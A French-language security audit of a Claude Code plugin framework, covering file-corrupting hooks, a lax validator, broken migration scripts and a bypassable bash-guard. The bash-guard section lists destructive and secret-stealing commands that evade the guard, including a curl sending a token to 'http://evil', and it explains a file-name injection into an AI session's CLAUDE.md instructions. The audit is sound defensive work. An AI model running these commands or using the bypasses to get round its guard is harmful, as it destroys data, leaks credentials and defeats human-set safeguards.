# Audit adversarial — Maestro 5.3.1

**Date** : 2026-08-01 · **Périmètre** : `~/Documents/maestro-v5-work/maestro` @ `04bd136` (tag v5.3.1)
**Méthode** : lecture intégrale des 100 fichiers versionnés (170 Ko) + reproduction en sandbox
de chaque défaut (Node 22, bash, projets v4 synthétiques). Tout ce qui est marqué **CONFIRMÉ**
a été exécuté, pas déduit.

---

## Verdict en une page

Le **contenu métier est excellent** — `01-rtl-i18n`, `02-pdf-rtl`, `expert-postures`,
`cognitive-protocols`, les contrats de skills : c'est du niveau publiable, et c'est le vrai
différenciateur. La **philosophie est juste** : le diagnostic v4 (qualité au runtime → crash)
et le remède (qualité au workflow) tiennent.

Le problème est ailleurs, et il est systémique :

> **Les trois mécanismes qui garantissent la philosophie — `validate.js`, `bash-guard.js`,
> `memory-sync.js` — donnent une assurance qu'ils ne fournissent pas.**
> Les 34 tests passent au vert pendant que 45 contournements de `bash-guard` sont vivants.
> `validate.js` accepte en vert une PR qui rétablit 5 hooks tsc/jest/prettier — c'est-à-dire
> exactement le crash du 13/07/2026. Et `memory-sync.js`, le seul hook qui **écrit** dans le
> dépôt, détruit du contenu utilisateur dans deux scénarios reproductibles.

Le CHANGELOG 5.3.0 dit : *« Every Philosophy rule that was "instructed" is now ENFORCED by the
platform »*. C'est la phrase la plus risquée du dépôt : elle transforme une suggestion en
garantie perçue, et fait baisser la garde là où il faudrait la garder.

Deux nuances importantes :

- La migration des 32 projets est **déjà faite** (juillet). Les défauts des scripts sont donc
  surtout un **risque de ré-exécution** (`verify-migration.sh` recommande explicitement de
  relancer `migrate-v4-to-v5.sh`, présenté comme idempotent — il ne l'est pas) et une dette si
  ces scripts sont réutilisés ailleurs.
- `memory-sync.js` et `bash-guard.js`, eux, tournent **en ce moment, dans chaque session, sur
  les 32 projets**. C'est là que se trouve le risque actif.

---

## P0 — À corriger avant la prochaine session de travail

### P0-1 · `memory-sync.js` détruit du contenu de CLAUDE.md — CONFIRMÉ

`plugins/maestro-core/hooks/memory-sync.js:86-92` cherche la **première** occurrence de
`<maestro_memory>` et la **première** de `</maestro_memory>` avec `indexOf`, sans appairage.
Si le tag ouvrant apparaît ailleurs — une phrase de doc, un bloc de code, un exemple — tout ce
qui se trouve entre les deux est supprimé.

Reproduit ici, en une exécution du hook :

```
AVANT                                          APRÈS
# Projet                                       # Projet
Le bloc <maestro_memory> est géré auto.        Le bloc <maestro_memory>
                                               <!-- always loaded -->
## RÈGLES CRITIQUES                            @maestro_docs/memory/a.md
- Ne jamais toucher billing/                   </maestro_memory>
- Montants en halalas

<maestro_memory>
@old.md
</maestro_memory>
```

Six lignes de règles projet effacées, sans avertissement, sans sauvegarde, sans code de sortie
non nul. Le fichier est normalement versionné — la seule récupération est `git checkout`, à
condition de s'en apercevoir.

**Variante confirmée** : si le tag *fermant* apparaît avant l'ouvrant (`closeIdx > openIdx`
faux, ligne 90), le hook **ajoute** un nouveau bloc — et recommence à chaque session. Mesuré :
4 tags ouvrants après 3 sessions, croissance linéaire d'environ 230 octets/session, tout injecté
dans le contexte à chaque démarrage.

**Correctif** : regex appariée `/<maestro_memory>[\s\S]*?<\/maestro_memory>/g`, exiger
**exactement une** correspondance, et **sortir sans écrire** (exit 0) si 0 ou ≥ 2. Ne jamais
tomber dans la branche « append » quand un tag existe déjà.

---

### P0-2 · `memory-sync.js` : deux sessions simultanées corrompent CLAUDE.md — CONFIRMÉ

Lecture (`:81`) puis `writeFileSync` (`:99`), sans lock, sans écriture atomique.
`writeFileSync` tronque à 0 puis écrit en flux.

200 essais, deux hooks concurrents sur un CLAUDE.md de 44 Ko (le cas « deux fenêtres Claude
Code sur le même projet ») :

```
4 essais / 200 corrompus
  essai  63 : 45 048 o → 89 o        (99,8 % du fichier détruit)
  essai 168 : 45 048 o → 16 472 o
sonde concurrente : taille minimale observée = 0 octet
```

La fenêtre à 0 octet est le vrai danger : si l'autre session lit le fichier à cet instant, elle
réécrit du contenu vide **de façon permanente**.

Ce cas est explicitement dans la doctrine : règle #3, *« Lock required if anything async »*.
Le hook n'est pas async — mais deux **processus** le sont.

**Correctif** : écrire dans `CLAUDE.md.<pid>.tmp` + `fs.renameSync` (atomique), sous verrou
`fs.openSync(lock, 'wx')` avec péremption ; abandonner silencieusement en cas de contention.

---

### P0-3 · `validate.js` laisse passer au vert un retour au v4 — CONFIRMÉ

PR de test : `.claude/settings.json` à la racine avec **5 hooks** (`tsc --noEmit`,
`jest --findRelatedTests`, `prettier --write .`, `eslint --fix .` sur `PostToolUse`, plus
`jest --watchAll` sur `Stop`), un agent reviewer `m-approver.md` avec `tools: Read, Edit, Write`,
et une skill sans `actions/`.

```
$ node scripts/validate.js
All checks passed.
exit 0
```

C'est exactement la configuration du 13/07/2026. Causes précises :

| Ligne | Ce qui est vérifié | Ce qui échappe |
|---|---|---|
| `:63-70` | seulement `plugins/**/hooks.json` | `.claude/settings.json`, `hooks-extra.json`, clé `hooks` dans `plugin.json` — les 3 contournements confirmés |
| `:95` | strip des commentaires par regex naïve | une URL `https://…` mange la fin de sa ligne → `execSync('npx jest')` invisible. Inversement, une **chaîne** contenant le mot `prettier` fait échouer le validateur |
| `:118-120` | `isReviewer = /checker\|devil-advocate/.test(nomDeFichier)` | `m-reviewer.md`, `m-auditor.md`, `m-critic.md` (sans `tools:` du tout) passent tous en vert. `\bEdit\b` ne bloque pas `NotebookEdit` |
| `:82` | `${CLAUDE_PLUGIN_ROOT}` présent **quelque part** dans le fichier | une commande en chemin absolu hors dépôt passe si le littéral est dans un commentaire JSON ; `timeout` manquant n'est pas vu |
| `:51-56` | `name` + `description` dans le frontmatter | règle #4 (`actions/*.md` + `## Test`) : **non vérifiée** |

**Point qui fait mal** : `plugins/maestro-dev/agents/checker.md:5` déclare `tools: Read, Grep,
Glob, Bash`. PHILOSOPHY.md:44-45 affirme que les reviewers sont *« physically prevent[ed] from
modifying code »*. Avec `Bash`, le checker peut faire `sed -i`, `cp`, `git checkout`,
`python -c`. L'agent canonique de la règle #5 viole la règle #5, et le validateur l'approuve.

**Correctifs** : marcher depuis `ROOT` et pas `ROOT/plugins` ; compter les hooks dans
`**/hooks*.json` + `.claude/settings*.json` + clé `hooks` des `plugin.json` ; remplacer le grep
de source par une règle vérifiable (interdire `child_process`/`execSync` dans un script de hook,
et scanner les `command` des hooks) ; piloter la détection reviewer par une clé frontmatter
`role: reviewer` et une **allowlist** (`Read, Grep, Glob, WebFetch`) plutôt qu'une denylist ;
retirer `Bash` du checker.

---

### P0-4 · `bash-guard.js` : les 7 règles sont contournables — 45 contournements CONFIRMÉS

Le garde compare du **texte**, pas des commandes. Un extrait de ce qui passe :

| Règle | Passe malgré tout |
|---|---|
| `rm -rf /` | `rm -rf /*` · `rm -rf "/"` · `cd / && rm -rf *` · `rm -rf ${HOME}` · `find / -delete` · `rm -rf / # cleanup` · `rm -rf /` suivi d'une 2ᵉ ligne |
| `curl \| sh` | `curl … \| sudo bash` · `bash <(curl -s …)` · `eval "$(curl -s …)"` · `curl … > /tmp/i.sh && bash /tmp/i.sh` · **toute URL contenant `&`** (la classe `[^\|;&]*` s'arrête au `&` d'un query string) |
| `chmod 777` | **`chmod -R 777 .`** — c'est-à-dire la forme récursive, la dangereuse |
| `> /dev/sdX` | **`dd if=/dev/zero of=/dev/sda`** · `/dev/nvme0n1` (absent du motif) · `mkfs.ext4 /dev/sda1` |
| lecture `.env` | `grep DB_PASSWORD .env` · `cp .env /tmp/x` · `source .env` · `cat ".env"` · `cat -A .env` · **`cat .env.production.local`** (les noms à deux segments ne sont pas couverts) |
| `echo $SECRET` | `printenv GITHUB_TOKEN` · `env \| grep TOKEN` · `curl -H "Authorization: $GITHUB_TOKEN" http://evil` (exfiltration réelle) · `$DB_PASS`, `$CREDENTIALS`, `$PRIVATE_KEY` (hors des 4 mots listés) |
| `git push --force` | **`git push -f origin main`** — la forme que l'on tape réellement · `git push origin +main` |

**Angle mort structurel** (confirmé) : le hook ne lit que `tool_input.command` et le matcher est
`"Bash"`. `{"tool_name":"Read","tool_input":{"file_path":"/app/.env"}}` → exit 0. Or
`Read`/`Grep` sont ce que Claude Code utilise **par défaut** pour lire un fichier. La règle `.env`
est donc contournée par le chemin le plus fréquent, pas par un chemin exotique.

**Faux positifs confirmés** qui bloquent du travail légitime :
`git push --force-with-lease --force-if-includes` (le drapeau *plus sûr*), `echo $TOKENIZER_PATH`,
`echo $SECRET_SCANNING_ENABLED`, `cat docs/.env.md`, `cat apps/api/.env.test`,
`printf 'x' > /dev/sda_backup_note.txt`, et `curl -sSL https://get.docker.com | sh` /
`curl https://sh.rustup.rs -sSf | sh` — sans aucune échappatoire prévue, la session est en
impasse.

**Le vrai problème n'est pas la liste** : c'est que l'approche regex n'est pas réparable en
ajoutant des motifs. Deux options honnêtes :

1. **Requalifier** le hook : ce n'est pas un contrôle de sécurité, c'est un garde-fou
   anti-accident. Le documenter comme tel, et déplacer la vraie défense vers
   `permissions.deny` natif de Claude Code (qui, lui, connaît la structure des outils et couvre
   `Read`/`Write`/`Grep`).
2. **Tokeniser** avant de matcher : découper sur `;`, `&&`, `||`, `|`, retours ligne ;
   déquoter ; matcher sur `argv[0]` + arguments normalisés ; refuser (au lieu d'autoriser) en cas
   d'échec de parsing pour les verbes à risque.

Et dans les deux cas : ajouter une échappatoire explicite pour les faux positifs.

**Corollaire** : `scripts/tests/bash-guard.test.sh` affiche `34 passed, 0 failed` pendant que
tout ce qui précède est vivant. Le harnais construit son JSON par `echo "{…\"command\":\"$2\"}"` :
il est **structurellement incapable d'exprimer** une commande contenant un guillemet, un
antislash ou un retour à la ligne — précisément les classes de contournement ci-dessus. Les
34 cas sont une transcription des regex, pas de la menace.

---

## P1 — Scripts de migration : à corriger avant toute ré-exécution

`docs/MIGRATION-FROM-V4.md:22-24` promet *« backs up everything it touches […], idempotent
(re-running is harmless) »*. **Les deux moitiés de la phrase sont fausses**, et
`verify-migration.sh:86` conseille pourtant de relancer le script.

| # | Fichier:ligne | Défaut (tous CONFIRMÉS en sandbox) |
|---|---|---|
| **P1-1** | `migrate:144-146` | La liste de backup **omet** `.claude/settings.json`, `CLAUDE.md` et `maestro_docs/memory-bank`. Ces trois-là sont réécrits ou supprimés sans copie. **Correctif : 3 lignes — le meilleur ratio du dépôt.** |
| **P1-2** | `migrate:249-255` | Un `settings.json` non parsable (virgule traînante) → `d = {}` → `model`, `env`, `permissions.allow`, `statusLine` perdus, et le script affiche `✅ projet propre` |
| **P1-3** | `migrate:264-265` | `if bad or hooks: d["hooks"] = {}` — la liste `bad` est calculée puis **ignorée** : tout hook custom bénin est effacé, avec le message `résidus retirés: 0` |
| **P1-4** | `migrate:342-349` | Même bug d'appairage que P0-1, sur `<maestro_routing>` dans CLAUDE.md : une simple mention en prose fait supprimer tout ce qui suit jusqu'au tag fermant |
| **P1-5** | `migrate:52-58` | Aucune branche « option inconnue » : `--dryrun`, `-n`, `--dry` sont pris pour des noms de projet et **`DRY_RUN` reste à 0**. Confirmé : `--all --dryrun` a supprimé des fichiers pour de vrai |
| **P1-6** | `migrate:249,306` | Pas de `set -e`, aucun contrôle du code retour des blocs Python, et `$P` interpolé dans le source Python. Répertoire nommé `say "hi" app` → `SyntaxError` ×2, `.claude/` laissé **vide**, tous les fichiers v4 déjà supprimés → `✅ projet propre`, exit 0. `verify-migration.sh:62` classe ensuite l'absence de settings.json en simple `WARN` et conclut `✅ AUCUNE contrebande v4` |
| **P1-7** | `migrate:237,242` | `gates.json` réécrit sans condition : un projet client passé en `paranoid` retombe en `standard` à la moindre ré-exécution |
| **P1-8** | `migrate:202-203` | Les fichiers memory sont **concaténés** en ré-exécution (contenu dupliqué, sans séparateur) |
| **P1-9** | `install-shortcuts.sh:28` | `cat > "$DIR/$1.md"` écrase sans prévenir. Les 20 noms (`plan`, `check`, `mem`, `ship`, `pr`, `sec`…) sont très collisionnels. Et `:39` affiche 20 ✅ même quand 0 fichier est écrit (`:79` compte le répertoire, pas les écritures) |
| **P1-10** | `setup-all.sh:86` | `git branch -M main` : lancé depuis une autre branche, écrase la référence `main` existante |
| **P1-11** | `verify:42`, `migrate:364` | `grep "claude-flow\|ruv-swarm"` : `\|` est une extension GNU. En BRE POSIX (grep BSD/macOS) le motif devient une chaîne littérale et ne matche jamais → `✅ AUCUNE contrebande` sur un projet qui en contient. À vérifier sur ta machine : `printf 'claude-flow\n' \| grep -c "claude-flow\|ruv-swarm"` doit afficher `1`. Correctif gratuit : `grep -E "claude-flow\|ruv-swarm"` |
| **P1-12** | `migrate:132` | Le garde-fou « working tree sale » utilise `[ -d "$P/.git" ]` — faux dans un worktree ou un sous-module, où `.git` est un **fichier**. Le seul filet qui rend P1-4 récupérable saute |
| **P1-13** | `migrate:133` | Un `git status` en échec (index.lock, git absent) renvoie une sortie vide → lu comme « propre » → migration lancée |
| **P1-14** | `migrate:168-175` | Le glob `"$P/scripts/hooks"/*` ignore les fichiers cachés → `.mon-hook.sh` supprimé avec le message *« ne contenait que du v4 »* |
| **P1-15** | `migrate:180-186` vs `verify:48-49` | `.claude/agents` et `.claude/skills` sont des fonctionnalités **v5 légitimes**. Migrate les supprime, verify les signale 🔴, et conseille de relancer migrate → boucle fermée |
| **P1-16** | `.gitignore` | `.maestro-v4-backup-*` n'est pas ignoré, alors que le script conclut par `git add -A && git commit` : anciens hooks et anciens settings (secrets possibles) commités dans ~30 dépôts clients |

**Point positif à noter** : la compat bash 3.2 est **propre** (aucun `declare -A`, `mapfile`,
`${var,,}`, `globstar` ; l'idiome `${PROJECTS[@]+"${PROJECTS[@]}"}` est correct), le JSON est
édité avec un vrai parseur et non `sed`, et `--dry-run` ne mute réellement rien — sauf via P1-5.

---

## P2 — Conformité plateforme (vérifiée sur la doc officielle)

Le CHANGELOG 5.3.0 fonde toute la release sur « conformité aux guidelines officielles ». Deux
clés utilisées ne sont **pas documentées** :

- **`user-invocable: false`** (sur `00-mobile-standards`, `00-web-standards`, `01-ux-standards`) :
  absent de la doc officielle des skills. Seul `disable-model-invocation: true` est documenté.
  Si la clé est ignorée, les trois skills « connaissance de fond » restent visibles dans le menu
  `/` — l'effet recherché (réduire le bruit) n'est pas obtenu, et PHILOSOPHY.md l'annonce comme
  « enforced ».
- **`strict`** et **`recommended`** dans `marketplace.json` (utilisés sur les 7 plugins) : non
  documentés. La doc précise que les champs inconnus sont ignorés au chargement. Le champ
  documenté pour ce besoin est `relevance`.

À vérifier côté CLI plutôt que sur la doc : `model: sonnet|opus` dans les agents (la doc modèle
montre des identifiants complets ; les alias fonctionnent en pratique, mais autant le confirmer
avec `claude plugin validate`).

**Recommandation transverse** : `claude plugin validate ./plugins/<nom>` existe et n'est câblé
ni dans `npm test` ni dans la CI. C'est le seul validateur qui suit l'évolution de la plateforme
— l'ajouter coûte une ligne et remplace une partie de `validate.js`.

---

## P3 — Cohérence interne du framework

| Constat | Détail |
|---|---|
| **Règle #4 non respectée par le framework lui-même** | 23 skills, **8 seulement** ont un dossier `actions/`. La règle dit *« Every skill = SKILL.md + actions/*.md, each with a `## Test` »*. Les 26 fichiers d'action existants ont tous leur `## Test` — mais rien ne le garantit, et 15 skills n'ont pas la structure exigée. Soit la règle s'assouplit (skills « contrat simple » vs « router »), soit les 15 se restructurent. Le statu quo affaiblit toutes les autres règles |
| **Règle #5 contredite par `checker.md`** | `tools: … Bash` — voir P0-3 |
| **Métriques invérifiables** | PHILOSOPHY.md:73 annonce `bash-guard <20 ms` ; mesuré **40-50 ms** (démarrage Node). `memory-sync <100 ms` : 41-67 ms sur un projet typique, pour une **base de 56 ms** en `node -e ''` — il n'y a aucune marge, et avec beaucoup de fichiers `internal/` la mesure passe à 164-256 ms (aucun plafond sur la liste, `memory-sync.js:53-65`) |
| **CI presque vide sur les hooks** | `.github/workflows/ci.yml` teste `memory-sync` par un `grep -q "maestro_memory"` sur un fixture vide : ce test passe dans **tous** les scénarios P0-1/P0-2/P0-3 |
| **Injection par nom de fichier** | `memory-sync.js:45` interpole `e.name` verbatim. Un nom de fichier contenant un retour ligne injecte du markdown arbitraire dans CLAUDE.md — donc dans les instructions de toutes les sessions suivantes. Cloner un dépôt tiers suffit. Correctif : filtrer sur `/^[\w.\-]+\.md$/` |
| **Symlinks** | `memory-sync.js` écrit **à travers** un `CLAUDE.md` symlinké (un CLAUDE.md global partagé se fait réécrire par chaque projet), et ignore silencieusement les fichiers memory symlinkés (`Dirent.isFile()` est faux pour un lien) |
| **Résidu local** | `plugins/maestro-dev/skills/01-plan/{actions,assets}/` — dossier vide né d'une expansion d'accolades non interprétée. Non versionné (git ignore les dossiers vides), purement cosmétique : `rmdir` |

---

## Ce qui est solide, et qu'il ne faut pas toucher

- **`01-rtl-i18n`, `02-pdf-rtl`, `rtl-checklist.md`** : les 6 catégories CLDR, `islamic-umalqura`,
  `letter-spacing: 0`, SarIcon en SVG, la route Playwright obligatoire, le piège des cellules
  bidi mixtes. C'est de l'expertise réelle, pas du remplissage. C'est ce qui justifie l'existence
  du framework.
- **`expert-postures.md` + `cognitive-protocols.md`** : denses, actionnables, sans bavardage.
  Le meilleur rapport signal/tokens du dépôt.
- **Les descriptions de skills** : elles disent *quand utiliser* **et** *quand ne pas utiliser*.
  C'est exactement ce qui fait un routage fiable, et c'est rarement bien fait.
- **La séparation executor/checker** et l'état résumable par frontmatter `status:` : conception
  juste. Il ne manque que l'application réelle (P0-3).
- **Le diagnostic v4 et la règle #8** (« never rebuild what Anthropic maintains ») : la bonne
  ligne stratégique, et la roadmap la tient.

---

## Plan de correction proposé — v5.3.2

**Aujourd'hui (≈ 1 h, gains disproportionnés)**

1. `memory-sync.js` : regex appariée + bail si ≠ 1 bloc (P0-1) — *le seul défaut qui détruit du
   travail en cours, sur 32 projets*
2. `memory-sync.js` : écriture atomique tmp+rename sous lock `wx` (P0-2)
3. `migrate-v4-to-v5.sh:146` : ajouter `.claude/settings.json`, `CLAUDE.md`,
   `maestro_docs/memory-bank` à la liste de backup (P1-1) — 3 lignes qui rendent P1-2/P1-3/P1-4
   récupérables
4. `migrate-v4-to-v5.sh:58` : `-*) err "option inconnue"; exit 2 ;;` (P1-5) — 1 ligne
5. `checker.md` : retirer `Bash` du `tools:` (P0-3)

**Cette semaine**

6. `validate.js` : marcher depuis `ROOT`, compter les hooks partout, allowlist reviewer pilotée
   par frontmatter, câbler `claude plugin validate` dans `npm test` (P0-3, P2)
7. `bash-guard.js` : décider entre requalification et tokenisation (P0-4), et **corriger la
   documentation** dans les deux cas ; réécrire le harnais de test pour qu'il puisse exprimer
   guillemets, antislashs et retours ligne
8. `migrate-v4-to-v5.sh` : `argv` au lieu de l'interpolation + `|| return 1` sur chaque bloc
   Python (P1-6) ; appairage du bloc routing (P1-4) ; `gates.json` conditionnel (P1-7)
9. Corriger `docs/MIGRATION-FROM-V4.md:22-24` (« backs up everything / idempotent ») et
   `verify-migration.sh:86`

**Ensuite**

10. Trancher la règle #4 : soit `actions/` obligatoire pour les 15 skills concernées, soit deux
    catégories de skills explicitement décrites dans PHILOSOPHY.md
11. Remplacer les métriques de latence par des mesures réelles, ou les retirer
12. `user-invocable` / `strict` / `recommended` : confirmer par `claude plugin validate`, sinon
    aligner sur les mécanismes documentés
13. Le jalon qui reste, et qui vaut plus que tout le reste : **la première vraie feature via
    `/sdlc`**. Tout ce qui précède est de la fiabilité d'infrastructure ; le pipeline lui-même
    n'a encore jamais tourné en conditions réelles.

---

## Note d'exploitation

L'inspection a créé un `.git/index.lock` vide dans le dépôt (le pont vers ton disque ne peut pas
supprimer de fichier). À retirer avant le prochain commit :

```bash
rm -f ~/Documents/maestro-v5-work/maestro/.git/index.lock
```

`MAESTRO-CONTEXT-HANDOFF.md` est par ailleurs toujours non versionné (`??`).
